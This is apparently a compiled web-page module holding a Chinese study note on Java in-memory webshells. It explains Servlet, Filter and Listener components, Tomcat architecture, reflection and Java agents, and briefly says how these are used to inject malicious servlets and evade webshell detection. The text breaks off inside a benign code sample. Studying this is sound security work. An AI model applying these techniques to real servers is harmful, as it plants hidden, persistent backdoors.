import{_ as r}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as k,a as n,d as a,b as e,f as s,e as l,r as p,o as d}from"./app-CFt4SMiv.js";const o={};function c(g,i){const h=p("Mermaid"),t=p("RouteLink");return d(),k("div",null,[i[19]||(i[19]=n('<h1 id="java内存马" tabindex="-1"><a class="header-anchor" href="#java内存马"><span>Java内存马</span></a></h1><blockquote><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p></blockquote><hr><ul><li><a href="#java%E5%86%85%E5%AD%98%E9%A9%AC">Java内存马</a><ul><li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li><li><a href="#javaweb%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB">JavaWeb内存马分类</a></li><li><a href="#java-web-%E4%B8%89%E5%A4%A7%E4%BB%B6">Java Web 三大件</a><ul><li><a href="#servlet">Servlet</a><ul><li><a href="#%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B">请求的处理过程</a></li><li><a href="#servlet-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">Servlet 生命周期</a></li></ul></li><li><a href="#filter">Filter</a><ul><li><a href="#filter%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">Filter的基本工作原理</a></li><li><a href="#filter%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">Filter的生命周期</a></li><li><a href="#filter%E9%93%BE">Filter链</a></li></ul></li><li><a href="#listener">Listener</a></li></ul></li><li><a href="#servlet%E5%AE%B9%E5%99%A8">Servlet容器</a><ul><li><a href="#tomcat">Tomcat</a><ul><li><a href="#tomcat%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1">Tomcat架构设计</a></li></ul></li></ul></li><li><a href="#javaweb%E5%86%85%E5%AD%98%E9%A9%AC%E9%A2%86%E5%9F%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E6%A6%82%E5%BF%B5">JavaWeb内存马领域的一些常见概念</a><ul><li><a href="#java%E5%8F%8D%E5%B0%84">Java反射</a></li><li><a href="#java-instrumentation">java instrumentation</a><ul><li><a href="#java-agent">Java Agent</a></li></ul></li></ul></li><li><a href="#servlet-api-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Servlet API 型内存马</a><ul><li><a href="#servlet-api-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5">Servlet API 型内存马的一些相关概念</a></li><li><a href="#servlet-30-%E6%8F%90%E4%BE%9B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E6%9C%BA%E5%88%B6">Servlet 3.0+ 提供动态注册机制</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E9%A1%B9%E7%9B%AE%E6%98%AF%E5%90%A6%E6%98%AF-servlet-30-%E4%BB%A5%E4%B8%8A%E7%9A%84%E9%A1%B9%E7%9B%AE">如何确认项目是否是 Servlet 3.0 以上的项目</a></li></ul></li><li><a href="#filter-%E5%86%85%E5%AD%98%E9%A9%AC">Filter 内存马</a></li><li><a href="#servlet%E5%86%85%E5%AD%98%E9%A9%AC">Servlet内存马</a></li><li><a href="#listener%E5%86%85%E5%AD%98%E9%A9%AC">Listener内存马</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li></ul></li><li><a href="#%E6%8E%A7%E5%88%B6%E5%99%A8%E6%8B%A6%E6%88%AA%E5%99%A8%E7%AE%A1%E9%81%93">控制器,拦截器,管道</a><ul><li><a href="#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC">Spring Controller 内存马</a></li><li><a href="#spring-interceptor-%E5%86%85%E5%AD%98%E9%A9%AC">Spring Interceptor 内存马</a></li><li><a href="#tomcat-valve%E5%86%85%E5%AD%98%E9%A9%AC">Tomcat Valve内存马</a></li></ul></li><li><a href="#%E7%A4%BA%E4%BE%8B--tomcat-servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">示例 -Tomcat-ServletAPI型内存马</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li><li><a href="#%E7%BC%96%E5%86%99%E4%B8%8E%E9%83%A8%E7%BD%B2servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">编写与部署ServletAPI型内存马</a></li></ul></li><li><a href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%8E%92%E6%9F%A5">检测与排查</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E6%A3%80%E6%B5%8B">源码检测</a></li><li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5">内存马排查</a></li></ul></li><li><a href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5">相关链接</a></li></ul></li></ul><hr><h2 id="概述" tabindex="-1"><a class="header-anchor" href="#概述"><span>概述</span></a></h2><p><strong>针对 JavaWeb 的内存马注入最后都要在 Servlet 容器上运行, 所以最终都指向需要能够被 Tomcat/Jetty 这样的 Servlet 容器解析的内存马</strong></p><p>内存马技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。</p><p>这种动态注册技术来源非常久远，在安全行业里也一直是不温不火的状态，直到冰蝎的更新将 java agent 类型的内存马重新带入大众视野并且瞬间火爆起来。</p><p>目前针对常规文件型的 Webshell 的查杀已经十分成熟了, 进而需要掌握内存马的编写与绕过技术</p><hr><h2 id="javaweb内存马分类" tabindex="-1"><a class="header-anchor" href="#javaweb内存马分类"><span>JavaWeb内存马分类</span></a></h2><blockquote><p><a href="https://su18.org/post/memory-shell/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>目前安全行业主要讨论的内存马主要分为以下几种方式：</p><ul><li>动态注册 servlet/filter/listener（使用 servlet-api 的具体实现）</li><li>动态注册 interceptor/controller（使用框架如 spring/struts2）</li><li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li><li>使用 java agent 技术写入字节码</li></ul><hr><h2 id="java-web-三大件" tabindex="-1"><a class="header-anchor" href="#java-web-三大件"><span>Java Web 三大件</span></a></h2><blockquote><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/chenwiehuang/article/details/80811193" target="_blank" rel="noopener noreferrer">java web请求三大器——listener、filter、servlet_listenser filter web 三大组件-CSDN博客</a></p></blockquote><hr><h3 id="servlet" tabindex="-1"><a class="header-anchor" href="#servlet"><span>Servlet</span></a></h3><p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p><p>在Java中，<code>Servlet</code>是一个实现了<code>javax.servlet.Servlet</code>接口的Java类。通常，开发者会创建一个自定义的Servlet类来处理特定的请求，这个类包含具体的业务逻辑，比如从数据库中获取数据、处理表单提交等。</p><hr><h4 id="请求的处理过程" tabindex="-1"><a class="header-anchor" href="#请求的处理过程"><span>请求的处理过程</span></a></h4><ol><li><p><strong>客户端发起请求</strong>：客户端（通常是浏览器）向服务器发起一个HTTP请求，比如一个<code>GET</code>请求</p></li><li><p><strong>请求到达Servlet容器</strong>：Servlet容器（如Tomcat、Jetty等）接收到请求，并根据请求的URL确定应该由哪个Servlet来处理这个请求。</p></li><li><p><strong>封装请求对象</strong>：Servlet容器会将请求封装成<code>HttpServletRequest</code>对象，将响应封装成<code>HttpServletResponse</code>对象。这两个对象提供了与请求和响应相关的信息，如请求参数、请求头信息和响应数据。</p></li><li><p><strong>调用<code>init()</code>方法</strong>：Servlet 容器通常会在第一次触发 Servlet 的请求发生时实例化该 Servlet</p><p>在处理请求之前，Servlet容器会确保该Servlet实例已经被创建（如果还没有创建过）。如果这是第一次请求该Servlet，容器将调用Servlet的<code>init()</code>方法来完成Servlet的初始化工作。</p><p><code>init()</code>方法只会在Servlet的生命周期内被调用一次。</p></li><li><p><strong>调用<code>service()</code>方法</strong>：Servlet容器调用Servlet实例的<code>service()</code>方法，传入<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象。<code>service()</code>方法根据请求的HTTP方法（如<code>GET</code>、<code>POST</code>等）来决定调用相应的<code>doGet()</code>或<code>doPost()</code>方法。</p></li><li><p><strong>调用相应的<code>doXXX()</code>方法</strong>：由于请求类型为<code>GET</code>，所以容器将调用Servlet的<code>doGet()</code>方法。这个方法通常包含了应用的具体业务逻辑，如数据库查询、数据处理等。</p></li><li><p><strong>返回响应结果</strong>：在业务逻辑处理完成后，<code>doGet()</code>方法会通过<code>HttpServletResponse</code>对象将结果（如HTML页面、JSON数据等）写回给客户端。</p></li><li><p><strong>结束请求处理</strong>：请求处理结束后，Servlet容器将返回生成的响应给客户端（浏览器）。</p></li><li><p><strong>调用<code>destroy()</code>方法</strong>：在容器关闭或Servlet被卸载时，Servlet容器将调用Servlet的<code>destroy()</code>方法，以释放Servlet占用的资源。<code>destroy()</code>方法只会在Servlet被销毁前调用一次。</p></li></ol><p>通过这个过程，Servlet能够动态地生成和返回Web内容给客户端。</p><hr><h4 id="servlet-生命周期" tabindex="-1"><a class="header-anchor" href="#servlet-生命周期"><span>Servlet 生命周期</span></a></h4><ol><li><p>服务器启动时( <code>web.xml</code> 中配置 <code>load-on-startup=1</code>，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法<code>init(ServletConfig conf)</code></p><blockquote><p>如果在 <code>web.xml</code> 文件中配置了 <code>load-on-startup</code> 属性为正整数（如<code>1</code>），则表示这个 Servlet 会在服务器启动时被加载和初始化。这种方式叫做<strong>提前加载（Eager Loading）</strong>。数字越小表示优先级越高</p><p>只有当 <code>load-on-startup</code> 为 <code>0</code> 或负数时，Servlet 容器会采用延迟加载，即在第一次请求时初始化该 Servlet</p></blockquote></li><li><p><code>service(ServletRequest req，ServletResponse res)</code> 方法是 Servlet 处理客户端请求的入口点</p><p>每次有请求到达时，Servlet 容器会调用 Servlet 实例的 <code>service</code> 方法，该方法会根据请求的 HTTP 方法（如 GET、POST 等）调用相应的 <code>doGet()</code> 或 <code>doPost()</code> 方法</p></li><li><p>在服务器关闭、应用程序卸载或重新部署时，Servlet 容器会调用 Servlet 的 <code>destroy()</code> 方法。这个方法的调用是为了允许 Servlet 进行一些清理工作，例如释放资源（如关闭数据库连接、释放文件句柄等）</p></li><li><p>在 <code>destroy()</code> 方法被调用之后，Servlet 实例将变得不可达（没有引用指向它）。此时，JVM 的垃圾回收器（Garbage Collector，GC）将负责回收这个对象的内存</p><blockquote><p>垃圾回收的时机由 JVM 决定，因此无法精确控制它什么时候会发生。但通常来说，<code>destroy()</code> 方法被调用后，JVM 会在适当的时候回收该对象的内存。</p></blockquote></li></ol><hr><h3 id="filter" tabindex="-1"><a class="header-anchor" href="#filter"><span>Filter</span></a></h3><p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；</p><blockquote><p>也就是充当一个全局的请求/响应拦截修改器的作用</p><p>FastAPI 中的中间件作用与此相似</p></blockquote><p>在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p><hr><h4 id="filter的基本工作原理" tabindex="-1"><a class="header-anchor" href="#filter的基本工作原理"><span>Filter的基本工作原理</span></a></h4><ol><li><p>Java Web Filter 是一个实现了 <code>javax.servlet.Filter</code> 接口的 Java 类，与 Servlet 一样由 Servlet 容器（如 Tomcat、Jetty）调用和执行。Filter 类需要实现 <code>doFilter</code> 方法，并在其中编写拦截逻辑。</p></li><li><p>可以在web.xml 注册一个 Filter 来对某个 Servlet 程序进行拦截处理</p><p>Filter 的主要功能之一就是拦截请求，它可以决定是否将请求传递给目标 <code>Servlet</code> 或其他过滤器，并有能力在请求和响应传递前对其进行修改。</p></li><li><p>当一个 HTTP 请求到达 Servlet 容器时，Servlet 容器首先检查请求的 URL 模式是否与任何注册的 <code>Filter</code> 匹配。如果匹配，Servlet 容器会调用 <code>Filter</code> 的 <code>doFilter</code> 方法。<code>doFilter</code> 方法可以选择是否继续调用过滤器链（<code>FilterChain.doFilter</code>）使得目标 Servlet 的 <code>service</code> 方法最终被调用。</p></li><li><p><code>Filter</code> 不直接调用目标 <code>Servlet</code> 的 <code>service</code> 方法，而是调用 <code>FilterChain.doFilter</code> 方法。<code>FilterChain</code> 是由 Servlet 容器管理的对象，它决定下一个要执行的 <code>Filter</code> 或最终的 <code>Servlet</code>。</p></li><li><p>通过在 <code>FilterChain.doFilter</code> 方法前后插入代码，可以在请求到达目标 Servlet 之前和响应返回客户端之前执行特定的逻辑，比如日志记录、性能监控等。</p></li><li><p>如果 <code>Filter</code> 的 <code>doFilter</code> 方法没有调用 <code>FilterChain.doFilter</code> 方法，目标 <code>Servlet</code> 的 <code>service</code> 方法就不会被执行。这种机制可以用于访问控制，防止非法请求。</p></li></ol><hr><h4 id="filter的生命周期" tabindex="-1"><a class="header-anchor" href="#filter的生命周期"><span>Filter的生命周期</span></a></h4><ul><li><strong>创建和初始化</strong>：Filter的创建和初始化确实由Web容器负责。Web应用程序启动时，Web服务器会创建Filter实例，并调用其<code>init</code>方法进行初始化。<code>init</code>方法只会执行一次，开发人员可以通过<code>FilterConfig</code>对象获取当前Filter的配置信息。</li><li><strong>驻留和销毁</strong>：Filter对象在创建后会驻留在内存中，直到Web应用被移除或服务器停止时才会销毁。在销毁前，Web容器会调用Filter的<code>destroy</code>方法，该方法也只会执行一次，用于释放Filter使用的资源。</li></ul><hr><h4 id="filter链" tabindex="-1"><a class="header-anchor" href="#filter链"><span>Filter链</span></a></h4><p>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在 <code>web.xml</code> 文件中的注册顺序，决定先调用哪个Filter。</p><p>当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</p><hr><h3 id="listener" tabindex="-1"><a class="header-anchor" href="#listener"><span>Listener</span></a></h3><p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p><ul><li><p><code>ServletContextListener</code>：对Servlet上下文的创建和销毁进行监听</p></li><li><p><code>ServletContextAttributeListener</code>：监听Servlet上下文属性的添加、删除和替换</p></li><li><p><code>HttpSessionListener</code>：对Session的创建和销毁进行监听</p><p>Session的销毁有两种情况: Session超时和调用Session对象的<code>invalidate()</code>方法</p></li><li><p><code>HttpSessionAttributeListener</code>：对Session对象中属性的添加、删除和替换进行监听</p></li><li><p><code>ServletRequestListener</code>：对请求对象的初始化和销毁进行监</p></li><li><p><code>ServletRequestAttributeListener</code>：对请求对象属性的添加、删除和替换进行监听</p></li></ul><hr><ul><li><code>用途</code>: 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</li></ul><hr><h2 id="servlet容器" tabindex="-1"><a class="header-anchor" href="#servlet容器"><span>Servlet容器</span></a></h2><h3 id="tomcat" tabindex="-1"><a class="header-anchor" href="#tomcat"><span>Tomcat</span></a></h3><blockquote><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p></blockquote><hr><p>简单理解，Tomcat 是 HTTP服务器 + Servlet 容器; 其主要功能包括:</p><ol><li><strong>接收和解析 HTTP 请求</strong>：Tomcat 接收来自客户端的 HTTP 请求，并将其解析为文本格式。</li><li><strong>封装请求和响应对象</strong>：Tomcat 将解析后的请求封装为 <code>HttpServletRequest</code> 对象，并将响应封装为 <code>HttpServletResponse</code> 对象。</li><li><strong>传递给 Servlet</strong>：封装后的 <code>HttpServletRequest</code> 对象会被传递给相应的 Servlet 进行处理。</li><li><strong>生成响应</strong>：Servlet 处理请求后，会生成响应内容，并通过 <code>HttpServletResponse</code> 对象返回给 Tomcat。</li><li><strong>发送响应</strong>：Tomcat 将 <code>HttpServletResponse</code> 对象中的内容转换为 HTTP 响应文本，并发送回客户端浏览器。</li></ol>',57)),a(h,{id:"mermaid-577",code:"eJx1kb9LAzEUx2fvrwjIbY0U0eUKLjo4OEgtOJQOucvrNXjNnUnOVrjJSZQOoosgYp0EocWp6OAfI171zzB3sT/otcmQl7z3Pt/38nxBohY6qFoW8YGrejp4Hl+Ofl6HDUvGrvF2wMUSxBmI+jG444deetVP718a1hplAjzFQp4RkF7TnFrY9oiqm6NhfBoRgMJeyBVhXNOOzEs6eM9x80GMS0W4B7OYx+/P6xUghDHeSf4jq3Aag1RJAbWUv5Aqo5BLmOVOJfJk4BTlhm17AZFyD5qIQpPEgUJtInzGna1y1C1FhFLGfWczuyjoKkwC5nNHML+lKouE9vluZiKXeCe+CGNOtWwQCmcdytkuuaGgILAglMXS2Y66BcSkiA6jqqVr0LoVK6/WjNV0uV+rHf4OR+O3i2RupghvaN/XzVNSbHrJT5vgfjIPmMDT2176cZegXNOy7RXaRR3bXjHTIvUPDkgDGA=="}),i[20]||(i[20]=n(`<hr><h4 id="tomcat架构设计" tabindex="-1"><a class="header-anchor" href="#tomcat架构设计"><span>Tomcat架构设计</span></a></h4><blockquote><p><a href="https://tomcat.apache.org/tomcat-9.0-doc/architecture/overview.html" target="_blank" rel="noopener noreferrer">Apache Tomcat 9 Architecture (9.0.93) - Architecture Overview</a></p><p><a href="https://segmentfault.com/a/1190000023475177" target="_blank" rel="noopener noreferrer">java - Tomcat 架构原理解析到架构设计借鉴 - 个人文章 - SegmentFault 思否</a></p></blockquote><p>Tomcat 简单来说可以理解为一个 Web服务器 + Servlet 容器, 他需要做网络连接和Servlet管理, 相对应的设计了两个核心组件来实现这两个功能: <code>连接器</code> 和 <code>容器</code></p><ul><li><code>连接器</code> 用于处理外部网络连接</li><li><code>容器</code> 用来处理内部 Servlet</li></ul><p>用一张图表示他们的关系:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409101616577.png" alt="image-20240910161255787"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409101616839.png" alt="容器"></p><ul><li><p><code>Server</code>：在 Tomcat 中，Server 代表整个容器; 一个 Server 可以包含多个 Service</p></li><li><p><code>Service</code>：一个 Service 是一个中间组件，它将一个或多个 Connector 连接到一个 Engine</p><ul><li>Tomcat 默认的 Service 名为 Catalina</li><li>一个 Service 服务可以包含多个连接器，因为 Tomcat 支持多种网络协议，包括 HTTP/1.1、HTTP/2、AJP 等等</li><li>一个 Service 服务还会包括一个容器，容器外部会有一层 Engine 引擎所包裹，负责与处理连接器的请求与响应，连接器与容器之间通过 ServletRequest 和 ServletResponse 对象进行交流</li></ul></li><li><p><code>Connector</code>：Connector 负责处理客户端的通信</p><p>Tomcat 支持多种协议，包括 HTTP/1.1、HTTP/2 和 AJP</p></li><li><p><code>Engine</code>：Engine 代表一个 Service 的请求处理管道。一个 Engine 可以包含多个 Host</p></li><li><p><code>Host</code>：Host 代表一个虚拟主机，通常与一个网络名称（如 www.example.com）相关联</p><p>一个 Engine 可以对应一个多个host, 外部访问的这些域名通过 DNS 解析后，通常会指向同一个 IP 地址。在这种情况下，Tomcat 通过配置多个 Host 来区分不同的虚拟主机，每个虚拟主机可以托管不同的 Web 应用。</p><p>当用户访问某个域名时，DNS 服务器会将该域名解析为相应的 IP 地址，然后请求会被发送到这台服务器上的 Tomcat 实例。Tomcat 会根据请求的 Host 头信息（即域名）来确定应该处理该请求的虚拟主机（Host），从而将请求路由到正确的 Web 应用。</p><p>这种配置方式允许你在同一台服务器上托管多个域名和 Web 应用，简化了管理和部署。</p></li><li><p><code>Context</code>：Context 代表一个 Web 应用。一个 Host 可以包含多个 Context，每个 Context 有一个唯一的路径</p></li><li><p><code>Wrapper</code>：Wrapper 代表一个 Servlet。一个 Context 可以包含多个 Wrapper</p></li><li><p><code>Mapper</code>：Mapper 组件负责将请求路径映射到相应的容器组件（如 Host、Context 和 Wrapper）</p><p>一个engine可以对一个多个host，也就是虚拟主机，一个host可以对应多个context，也就是web应用，一个context对应多个wrapper，也就是servlet。这个映射关系，通过mapper组件来关联，mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系。Host容器的域名，Context容器中的web路径，Wrapper容器中的servlet映射的路径，这些配置信息是多层次的Map。</p></li></ul><hr><p>根据请求定位到指定servlet的流程图如下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409101620154.jpeg" alt="img"></p><hr><h2 id="javaweb内存马领域的一些常见概念" tabindex="-1"><a class="header-anchor" href="#javaweb内存马领域的一些常见概念"><span>JavaWeb内存马领域的一些常见概念</span></a></h2><h3 id="java反射" tabindex="-1"><a class="header-anchor" href="#java反射"><span>Java反射</span></a></h3><blockquote><p><a href="https://mp.weixin.qq.com/s/TqSLUWYWfhHjpfI_srETJg" target="_blank" rel="noopener noreferrer">面试官：什么是Java反射？它的应用场景有哪些？ (qq.com)</a></p></blockquote><img src="http://cdn.ayusummer233.top/DailyNotes/202409101629674.jpeg" alt="img" style="zoom:200%;"><p>反射提供的功能，能在运行时（动态）地</p><ul><li>获取一个类的所有成员变量和方法</li><li>创建一个类的对象</li><li>获取对象成员变量&amp;赋值</li><li>调用对象的方法</li><li>判断对象所属的类</li></ul><p>在注入内存马的过程当中，我们可能需要用到反射机制，例如注入一个servlet型的内存马，我们需要使用反射机制来获取当前的context，然后将恶意的servlet（wrapper）添加到当前的context的children中。 在使用Java反射机制时，主要步骤包括:</p><ol><li>获取目标类型的Class对象</li><li>通过 Class 对象分别获取Constructor类对象、Method类对象 &amp; Field 类对象</li><li>通过 Constructor类对象、Method类对象 &amp; Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</li></ol><hr><h3 id="java-instrumentation" tabindex="-1"><a class="header-anchor" href="#java-instrumentation"><span>java instrumentation</span></a></h3><p>Java Instrumentation 是 Java SE 5 引入的一项功能，是Java提供的一个来自JVM的接口, 位于 <code>java.lang.instrument</code> 包中; 该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等, 使得开发者可以通过Java语言来操作和监控JVM内部的一些状态, 在 Java 虚拟机（JVM）加载类之前或之后对类进行修改, 进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）。</p><p>通过 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至能够替换和修改某些类的定义。例如，常见的应用包括监控代理、分析器、覆盖分析程序和事件日志记录程序。</p><hr><h4 id="java-agent" tabindex="-1"><a class="header-anchor" href="#java-agent"><span>Java Agent</span></a></h4><p>Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。</p><p>在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。</p><img src="http://cdn.ayusummer233.top/DailyNotes/202409101636570.jpeg" alt="img" style="zoom:200%;"><hr><h2 id="servlet-api-型内存马" tabindex="-1"><a class="header-anchor" href="#servlet-api-型内存马"><span>Servlet API 型内存马</span></a></h2><blockquote><p><a href="https://su18.org/post/memory-shell/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p><hr><h3 id="servlet-api-型内存马的一些相关概念" tabindex="-1"><a class="header-anchor" href="#servlet-api-型内存马的一些相关概念"><span>Servlet API 型内存马的一些相关概念</span></a></h3><ul><li><p><strong>Servlet</strong>：处理客户端的请求并生成响应，通常用于处理 HTTP 请求。</p><p><code>Servlet</code> 就像一个处理请求的“中间人”，当客户端（浏览器、APP）发送请求到服务器时，<code>Servlet</code> 负责</p><p>处理这些请求，并生成相应的响应结果，比如返回一个网页、数据或其他资源。</p><p>当你登录网站时，输入用户名和密码，然后点击登录按钮，这个动作就发出了一个请求。<code>Servlet</code> 接收到这个请求后，会验证你的用户名和密码是否合法，然后决定返回一个“登录成功”页面还是“登录失败”的错误信息页面。</p></li><li><p><strong>Listener</strong>：监听 Web 应用中的各种事件，如会话创建、销毁等，用于处理一些应用级别的逻辑。</p><p><code>Listener</code> 负责监听 Web 应用中的特定事件，比如用户登录、会话创建、应用启动或关闭等。当这些事件发生时，<code>Listener</code> 会自动执行相应的动作。</p><p>比如，当你打开一个电商网站并添加商品到购物车时，<code>Listener</code> 可以监听到你刚刚创建了一个会话（Session），并记录下相关信息，方便下次继续访问时保持你的购物车状态。</p></li><li><p><strong>Filter</strong>：用于对请求或响应进行预处理或后处理，常用于请求过滤、日志记录、权限验证等。</p><p><code>Filter</code> 负责对请求进行预处理，或者对响应进行后处理。常见的用途是权限控制、日志记录、请求参数过滤等。在请求到达 <code>Servlet</code> 之前，<code>Filter</code> 先对请求进行一些检查或操作；在 <code>Servlet</code> 返回响应后，<code>Filter</code> 还可以对响应进行修改。</p><p>比如你访问一个需要登录的页面，<code>Filter</code> 会先检查你是否已经登录，如果没有登录，它会拦截请求并将你重定向到登录页面，而不是直接让你访问内容。</p></li><li><p><code>ServletContext</code> 是 Java Web 应用中与整个 Web 应用相关的上下文对象。它提供了与 Web 容器交互的接口。所有的 <code>Servlet</code>、<code>Listener</code> 和 <code>Filter</code> 都通过 <code>ServletContext</code> 进行加载和管理。</p><p><code>ServletContext</code> 是整个应用的全局对象，它能在应用启动时初始化并保持整个生命周期</p><p><code>ServletContext</code> 是整个 Web 应用的共享空间, 每个 Web 应用只有一个 <code>ServletContext</code>，它代表了整个应用的上下文。所有的 <code>Servlet</code>、<code>Listener</code> 和 <code>Filter</code> 都可以访问这个 <code>ServletContext</code></p><p><code>ServletContext</code> 可以让不同的 <code>Servlet</code> 共享一些公共信息，比如初始化参数、文件资源、数据库连接池等。这样所有的 <code>Servlet</code> 不用各自去查找这些信息，可以直接通过 <code>ServletContext</code> 访问。</p><p>例如，多个 <code>Servlet</code> 可能需要读取同一个配置文件，<code>ServletContext</code> 可以统一管理这个文件并提供给所有 <code>Servlet</code> 使用。</p><p>一些具体例子:</p><ul><li><p><strong>Web 应用启动时初始化一些参数</strong>：比如你想在整个 Web 应用中保存一些配置信息（如数据库连接参数、系统版本信息），你可以通过 <code>ServletContext</code> 在应用启动时设置这些参数，所有的 <code>Servlet</code> 都能使用这些参数。</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> context </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> dbUrl </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getInitParameter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;databaseUrl&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>获取应用的文件资源</strong>：假设你的 Web 应用中有一些公共的图片或配置文件，<code>ServletContext</code> 可以帮你获取这些资源的路径，所有的 <code>Servlet</code> 都可以通过它找到这些公共资源。</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> context </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getServletContext</span><span 